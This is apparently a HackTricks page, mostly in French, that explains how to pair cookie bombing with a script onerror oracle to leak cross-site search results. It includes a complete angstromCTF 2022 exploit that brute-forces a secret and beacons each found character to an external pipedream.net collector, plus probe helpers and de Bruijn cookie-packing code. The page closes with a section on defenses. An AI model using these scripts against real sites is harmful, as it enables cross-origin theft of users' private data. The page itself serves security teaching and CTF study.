# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

This technique combines:
- Cookie bombing: remplir le navigateur de la victime avec de nombreux/gros cookies pour l'origine cible afin que les requêtes suivantes atteignent les limites serveur/requête (taille des en-têtes de requête, taille de l'URL dans les redirections, etc.).
- Error-event oracle: sonder un endpoint cross-origin avec un <script> (ou autre sous-ressource) et distinguer les états avec onload vs onerror.

High level idea
- Trouver un endpoint cible dont le comportement diffère pour deux états que vous voulez tester (par ex., recherche “hit” vs “miss”).
- S'assurer que le chemin « hit » déclenchera une chaîne de redirections lourde ou une URL longue tandis que le chemin « miss » reste court. Gonfler les en-têtes de requête en utilisant de nombreux cookies de sorte qu'uniquement le chemin « hit » provoque l'échec du serveur avec une erreur HTTP (par ex., 431/414/400). L'erreur inverse l'événement onerror et devient un oracle pour XS-Search.

When does this work
- Vous pouvez amener le navigateur de la victime à envoyer des cookies vers la cible (par ex., cookies SameSite=None ou vous pouvez les définir en contexte first-party via un popup window.open).
- Il existe une fonctionnalité de l'app que vous pouvez abuser pour définir des cookies arbitraires (par ex., endpoints “save preference” qui transforment des noms/valeurs contrôlables en Set-Cookie) ou pour faire des redirections post-auth qui incorporent des données contrôlées par l'attaquant dans l'URL.
- Le serveur réagit différemment selon les deux états et, avec des en-têtes/URL gonflés, un état dépasse une limite et renvoie une réponse d'erreur qui déclenche onerror.

Note on server errors used as the oracle
- 431 Request Header Fields Too Large est couramment renvoyé lorsque les cookies gonflent les en-têtes de requête ; 414 URI Too Long ou un 400 spécifique au serveur peut être renvoyé pour des cibles de requête longues. N'importe lequel de ceux-ci entraîne un échec du chargement de la sous-ressource et déclenche onerror. [MDN documents 431 and typical causes like excessive cookies.]()

Practical example (angstromCTF 2022)
Le script suivant (tiré d'un writeup public) abuse d'une fonctionnalité qui permet à l'attaquant d'insérer des cookies arbitraires, puis charge un endpoint de recherche cross-origin comme script. Quand la requête est correcte, le serveur effectue une redirection qui, combinée à la surcharge de cookies, dépasse les limites serveur et renvoie un statut d'erreur, donc script.onerror se déclenche ; sinon rien ne se passe.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
Pourquoi le popup (window.open) ?
- Les navigateurs modernes bloquent de plus en plus les third-party cookies. Ouvrir une fenêtre top-level vers la target rend les cookies first‑party, donc les réponses Set-Cookie du target persisteront, permettant l'étape cookie-bomb même avec des restrictions sur les third-party cookies.

2024–2025 notes on cookie availability
- Les navigateurs Chromium-based envoient encore couramment des third‑party cookies sauf si l'utilisateur ou le site se désactive, mais Safari et Firefox bloquent la plupart des third‑party cookies par défaut. Prévoyez les deux cas : (1) utilisez un flux de plantation de cookies first-party (window.open + auto-submit vers un cookie-setting endpoint) puis (2) probez avec une subresource qui ne réussit que lorsque ces cookies sont envoyés. Si les third‑party cookies sont bloqués, déplacez la probe dans un contexte same-site (par ex., exécutez l'oracle dans le popup via un same-site gadget et exfiltrez le booléen avec postMessage ou un beacon vers votre server).

Generic probing helper
Si vous avez déjà un moyen de définir de nombreux cookies sur l'origin de la target (first-party), vous pouvez réutiliser ce minimal oracle contre n'importe quel endpoint dont le succès/échec entraîne des résultats réseau différents (status/MIME/redirect) :
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Alternative tag oracle (feuille de style)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Avancé: de Bruijn–based cookie packing (CTF-proven)
- Lorsque l'application vous permet de contrôler de grandes valeurs de cookie, vous pouvez packer les guesses efficacement en ajoutant une de Bruijn sequence à chaque probe. Cela maintient la surcharge par probe faible tout en garantissant que la branche lourde est systématiquement plus lourde uniquement pour le bon préfixe. Exemple de générateur pour |Σ| symboles de longueur n (tient dans une valeur de cookie):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Idée en pratique : set multiple cookies whose values are prefix + deBruijn(k,n). Only when the tested prefix is correct does the server take the heavy path (e.g., extra redirect reflecting the long cookie or URL), which, combined with the cookie bloat, crosses limits and flips onerror. See a LA CTF 2024 public solver using this approach.

Tips to build the oracle
- Force the “positive” state to be heavier: chain an extra redirect only when the predicate is true, or make the redirect URL reflect unbounded user input so it grows with the guessed prefix.
- Inflate headers: repeat cookie bombing until a consistent error is observed on the “heavy” path. Servers commonly cap header size and will fail sooner when many cookies are present.
- Stabilize: fire multiple parallel cookie set operations and probe repeatedly to average out timing and caching noise.
- Bust caches and avoid pooling artifacts: add a random `#fragment` or `?r=` to probe URLs, and prefer distinct window names when using window.open loops.
- Alternate subresources: if `<script>` is filtered, try `<link rel=stylesheet>` or `<img>`. The onload/onerror boolean is the oracle; content never needs to be parsed.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs and servers enforce different caps. As of October 2025, Cloudflare documents 128 KB total for request headers (and 16 KB URL) on the edge, so you may need more/larger cookies when targets sit behind it. Other stacks (e.g., Apache via LimitRequestFieldSize) are often closer to ~8 KB per header line and will hit errors earlier. Adjust bomb size accordingly. [Cloudflare docs show the 128 KB header limit.]

Related XS-Search tricks
- URL length based oracles (no cookies needed) can be combined or used instead when you can force a very long request target:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Defenses and hardening
- Make success/failure responses indistinguishable:
- Avoid conditional redirects or large differences in response size between states. Return the same status, same content type, and similar body length regardless of state.
- Block cross-site subresource probes:
- SameSite cookies: set sensitive cookies to SameSite=Lax or Strict so subresource requests like <script src> don’t carry them; prefer Strict for auth tokens when possible.
- Fetch Metadata: enforce a Resource Isolation Policy to reject cross-site subresource loads (e.g., if Sec-Fetch-Site != same-origin/same-site).
- Cross-Origin-Resource-Policy (CORP): set CORP: same-origin (or at least same-site) for endpoints not meant to be embedded as cross-origin subresources.
- X-Content-Type-Options: nosniff and correct Content-Type on JSON/HTML endpoints to avoid load-as-script quirks.
- Reduce header/URL amplification:
- Cap the number/size of cookies set; sanitize features that turn arbitrary form fields into Set-Cookie.
- Normalize or truncate reflected data in redirects; avoid embedding attacker-controlled long strings in Location URLs.
- Keep server limits consistent and fail uniformly (avoid special error pages only for one branch).

Notes
- This class of attacks is discussed broadly as “Error Events” XS-Leaks. The cookie-bomb step is just a convenient way to push only one branch over server limits, producing a reliable boolean oracle.



## Références
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
{{#include ../../banners/hacktricks-training.md}}
